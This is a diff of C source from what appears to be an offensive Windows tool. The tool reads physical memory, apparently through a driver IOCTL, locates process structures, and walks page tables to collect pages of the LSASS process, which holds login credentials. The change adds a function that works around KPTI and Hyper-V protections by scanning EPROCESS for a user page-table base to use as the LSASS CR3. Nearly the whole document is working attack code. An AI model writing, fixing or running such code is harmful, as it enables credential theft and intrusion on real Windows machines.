@@ -424,12 +424,92 @@ static uint64_t find_proc_pa(uint64_t start_eproc_pa, const char *target_name,
  * ══════════════════════════════════════════════════════════════════════════ */
 
 /*
+ * diagnose_cr3 — print PML4 structure to understand cr3_walk failure.
+ *
+ * Two failure modes:
+ *   A) phys_read(pml4_pa) returns zeros → PML4 page itself is SLAT-protected
+ *   B) phys_read succeeds, but PML4[user_idx] = 0 → KPTI kernel CR3 has empty
+ *      user-half; need UserDirectoryTableBase instead
+ *
+ * Also scans EPROCESS for a candidate UserDirectoryTableBase (different from
+ * DirectoryTableBase, page-aligned, in physical range, PML4[user_idx] present).
+ */
+static void diagnose_cr3(uint64_t proc_cr3, uint64_t test_va, uint64_t eproc_pa)
+{
+    uint32_t user_pml4_idx = (uint32_t)((test_va >> 39) & 0x1FF);
+    printf("\n  [DIAG] CR3 = 0x%"PRIX64"  test_va = 0x%016"PRIX64"\n", proc_cr3, test_va);
+    printf("  [DIAG] Expected PML4 user index = %u\n", user_pml4_idx);
+
+    /* Case A: read 32 bytes from the PML4 page */
+    uint64_t pml4_base = proc_cr3 & ~0xFFFULL;
+    uint64_t sample[4] = {0};
+    if (!phys_read(pml4_base, sample, 32)) {
+        printf("  [DIAG] CASE A: phys_read(PML4_base=0x%"PRIX64") FAILED → SLAT blocks this page\n",
+               pml4_base);
+        printf("         The PML4 page of this process is inaccessible via guest PA.\n");
+        printf("         Hyper-V or nested virt protecting page table pages.\n");
+    } else {
+        int all_zero = 1;
+        for (int i = 0; i < 4; i++) if (sample[i]) { all_zero = 0; break; }
+        if (all_zero) {
+            printf("  [DIAG] CASE A (soft): phys_read OK but PML4 first 32 bytes all zero.\n");
+            printf("         Page may be SLAT-mapped to a zero page, or CR3 value is wrong.\n");
+        } else {
+            printf("  [DIAG] PML4 page readable. First 4 entries:\n");
+            for (int i = 0; i < 4; i++)
+                printf("    PML4[%d] = 0x%016"PRIX64"%s\n", i, sample[i],
+                       (sample[i]&1) ? " [P]" : " [not present]");
+        }
+
+        /* Read the specific user index */
+        uint64_t pml4_user_e = 0;
+        phys_read(pml4_base + user_pml4_idx * 8, &pml4_user_e, 8);
+        printf("  [DIAG] PML4[%u] (user idx) = 0x%016"PRIX64"%s\n",
+               user_pml4_idx, pml4_user_e, (pml4_user_e&1)?" [P]":" [NOT PRESENT ← CASE B]");
+
+        if (!(pml4_user_e & 1)) {
+            printf("  [DIAG] CASE B: kernel CR3 has empty user-half at idx %u.\n", user_pml4_idx);
+            printf("         This is KPTI behaviour — DirectoryTableBase (+0x28) is the kernel-only\n");
+            printf("         PML4; user-space pages are in UserDirectoryTableBase at another offset.\n");
+            printf("  [DIAG] Scanning EPROCESS for UserDirectoryTableBase candidate...\n");
+
+            uint8_t epbuf[0x800]; uint32_t found_off = 0;
+            if (phys_read(eproc_pa, epbuf, sizeof epbuf)) {
+                for (uint32_t off = 0x28+8; off+8 <= sizeof epbuf; off += 8) {
+                    uint64_t v; memcpy(&v, epbuf + off, 8);
+                    if (v == proc_cr3) continue;                     /* skip DTB itself */
+                    if ((v & 0xFFF) || v < 0x1000) continue;        /* must be page-aligned PA */
+                    if (!pa_in_range(v, 4096)) continue;
+                    /* Check: does PML4[user_pml4_idx] of this candidate have bit 0 set? */
+                    uint64_t cand_e = 0;
+                    if (phys_read(v + user_pml4_idx * 8, &cand_e, 8) && (cand_e & 1)) {
+                        printf("  [DIAG] FOUND UserDirectoryTableBase candidate at EPROCESS+0x%X = 0x%"PRIX64"\n",
+                               off, v);
+                        printf("         PML4[%u] = 0x%016"PRIX64" [P] → use this as lsass_cr3!\n",
+                               user_pml4_idx, cand_e);
+                        found_off = off;
+                        break;  /* print first match; there may be more */
+                    }
+                }
+                if (!found_off)
+                    printf("  [DIAG] No UserDirectoryTableBase candidate found in EPROCESS[0..0x800].\n");
+            }
+        }
+    }
+
+    /* Also count how many PML4 user-half entries are present */
+    uint64_t pml4_buf[256];
+    if (phys_read(pml4_base, pml4_buf, sizeof pml4_buf)) {
+        int n_present = 0;
+        for (int i = 0; i < 256; i++)
+            if (pml4_buf[i] & 1) n_present++;
+        printf("  [DIAG] User-half PML4 (entries 0-255): %d present\n\n", n_present);
+    }
+}
+
+/*
  * collect_proc_pages_at_va — walk the target process's page tables starting at
  * a given VA to collect consecutive mapped physical pages.
- *
- * WHY start from a specific VA (not scan all): scanning 256 PML4 entries would
- * require up to 256+ IOCTLs per level. Starting at the image base VA calculates
- * the exact PML4/PDPT/PD/PT indices directly → O(n_pages) IOCTLs only.
  */
 static int collect_proc_pages_at_va(uint64_t proc_cr3, uint64_t start_va,
                                      uint64_t *pas_out, int max_pages)
@@ -809,11 +889,8 @@ int main(int argc, char *argv[])
         printf("[*] Collecting LSASS physical pages via cr3_walk...\n");
         n_target = collect_proc_pages_at_va(lsass_cr3, lsass_base, target_pas, 16);
         if (!n_target) {
-            printf("[-] No LSASS pages found via cr3_walk.\n");
-            printf("    On Hyper-V: SLAT blocks reads of LSASS page-table pages.\n");
-            printf("    On physical AMD Ryzen: this should work.\n");
-            printf("    Workaround: use 'cr3_swap.exe <PA_hex>' with a known PA,\n");
-            printf("    or run on physical machine.\n");
+            printf("[-] No LSASS pages found via cr3_walk — running diagnostic...\n");
+            diagnose_cr3(lsass_cr3, lsass_base, lsass_eproc_pa);
             return 1;
         }
         printf("[+] Collected %d physical pages\n\n", n_target);
